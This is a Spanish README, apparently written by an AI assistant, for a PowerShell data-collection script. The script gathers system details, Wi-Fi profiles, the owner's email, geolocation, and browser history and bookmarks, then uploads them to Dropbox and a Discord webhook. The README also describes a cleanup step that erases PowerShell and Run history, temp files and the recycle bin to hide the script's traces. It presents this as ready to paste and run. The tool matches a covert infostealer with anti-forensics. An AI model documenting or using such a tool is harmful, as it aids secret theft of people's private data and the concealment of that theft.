
# Script de Recolección de Datos y Subida a Dropbox y Discord

Este script de PowerShell recolecta diversos datos del sistema, los guarda en un archivo comprimido y luego sube el archivo a Dropbox y Discord. También incluye funciones para limpiar cualquier rastro del script después de su ejecución.

## Características

- Recolecta información del sistema, usuarios locales, configuraciones, redes Wi-Fi cercanas, perfiles de Wi-Fi, procesos, servicios, software instalado, controladores, dispositivos COM y más.
- Recolecta historial y marcadores de los navegadores Edge, Chrome y Firefox.
- Guarda toda la información recolectada en un archivo comprimido.
- Sube el archivo comprimido a Dropbox.
- Envía el archivo comprimido a un webhook de Discord.
- Limpia los rastros del script, incluyendo el historial de PowerShell y la papelera de reciclaje.

## Requisitos

- PowerShell
- Conexión a Internet
- Token de API de Dropbox (almacenado en la variable de entorno `db`)
- URL del webhook de Discord (almacenada en la variable de entorno `dc`)
- Sistema con soporte para .NET y bibliotecas de Windows Forms

## Uso

### Parámetros Necesarios

- **db**: Token de API de Dropbox.
- **dc**: URL del webhook de Discord.

### Función Get-BrowserData

Esta función recolecta el historial y los marcadores del navegador especificado.

#### Parámetros

- **Browser**: El navegador del cual recolectar datos (`chrome`, `edge`, `firefox`).
- **DataType**: El tipo de datos a recolectar (`history`, `bookmarks`).

### Ejemplo de Uso

```powershell
Get-BrowserData -Browser "chrome" -DataType "history"
Get-BrowserData -Browser "edge" -DataType "bookmarks"
```

## Instalación

1. Clona el repositorio:
    ```bash
    git clone https://github.com/tuusuario/recoleccion-datos-sistema.git
    cd recoleccion-datos-sistema
    ```

2. Asegúrate de tener los permisos necesarios para ejecutar scripts de PowerShell en tu sistema.

## Detalles del Script

El script incluye las siguientes funciones:

- **Get-fullName**: Obtiene el nombre completo del usuario.
- **Get-email**: Obtiene el email del propietario del sistema.
- **Get-GeoLocation**: Obtiene la geolocalización del sistema.
- **Get-BrowserData**: Recolecta datos de los navegadores especificados.
- **DropBox-Upload**: Sube un archivo a Dropbox utilizando la API de Dropbox.
- **Upload-Discord**: Envía un archivo y/o mensaje a un webhook de Discord.
- **Cleanup**: Limpia los rastros del script, incluyendo el historial de PowerShell y la papelera de reciclaje.

### Limpieza

El script incluye comandos para limpiar cualquier rastro de su ejecución:

- Elimina el contenido de la carpeta temporal.
- Elimina el historial del cuadro de ejecución.
- Elimina el historial de PowerShell.
- Vacía la papelera de reciclaje.

### Ejecución del Script

Para ejecutar el script, simplemente cópialo y pégalo en una sesión de PowerShell con los permisos adecuados. Asegúrate de tener configuradas las variables de entorno `db` y `dc` con tu token de API de Dropbox y la URL del webhook de Discord, respectivamente.

## Licencia

Este proyecto está licenciado bajo la Licencia MIT. Ver el archivo `LICENSE` para más detalles.
```

Este README.md proporciona una descripción clara y completa de cómo usar y entender el script en español.
